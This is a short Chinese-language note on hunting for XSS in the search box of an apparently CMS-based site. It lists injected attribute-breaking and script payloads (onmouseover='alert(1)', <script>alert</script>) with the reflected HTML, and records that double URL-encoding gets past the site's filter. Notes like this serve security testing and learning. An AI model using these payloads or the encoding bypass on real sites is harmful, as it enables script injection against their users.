挖掘xss漏洞

http://chanzhi7.njhack.xyz/www/index.php/search-index-1-1.html

```php
<input type='text' name='words' id='words' value=' x ' class='form-control' placeholder='' /> 

<input type='text' name='words' id='words' value=' x'/><img ' class='form-control' placeholder='' /> 
```

出现bad request

x'/><img 进行url编码，发现404

再进行一次编码发现正常

我们发现，需要进行2次编码才可以绕过

-------
```php
<input type='text' name='words' id='words' value=' abc' onmouseover='alert(1) ' class='form-control' placeholder='' /> 
```

abc' onmouseover='alert(1) 进行2次编码

-------

```java
x'/><script>alert('haha')</script><img
```

进行2次url编码，发现<script>前后标签都没了

